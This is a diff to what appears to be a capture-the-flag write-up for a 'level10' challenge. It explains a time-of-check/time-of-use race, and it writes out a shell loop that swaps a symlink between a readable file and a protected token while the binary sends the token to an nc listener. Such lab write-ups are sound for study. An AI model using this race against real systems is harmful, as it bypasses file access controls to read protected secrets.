@@ -8,9 +8,14 @@ after that comes the call to open
 
 - we will perform a race condition attack, basically when access is called we need to argv[1]
 to be a file we read access to then when open is called argv[1] should be token.
-We can achieve this by switching between a symbolic link /tmp/token pointing to token
-and /tmp/file. Hopefully the timing will be right and /tmp/file will be passed to access and
-/tmp/token will be passed to token.
+We can achieve this by switching between a symbolic link /tmp/symlink pointing to 
+/home/user/level10/token and /tmp/file. Hopefully the timing will be right and /tmp/file will 
+be passed to access and /home/user/level10/token will be passed to open.
 
-- We'll use rename system call to race
+- with the help of a terminal multiplexer we'll infinit loop switching /tmp/symlink from
+/tmp/myfile to /home/user/level10/token.
 
+`while true; do ln -sf /home/user/level10/token /tmp/symlink; ln -sf /tmp/myfile /tmp/symlink; done`
+
+- we force the nc listener to keep listening (-k) even if the connection is complete then another infinite
+loop running ./level10 /tmp/symlink [ip of listener]
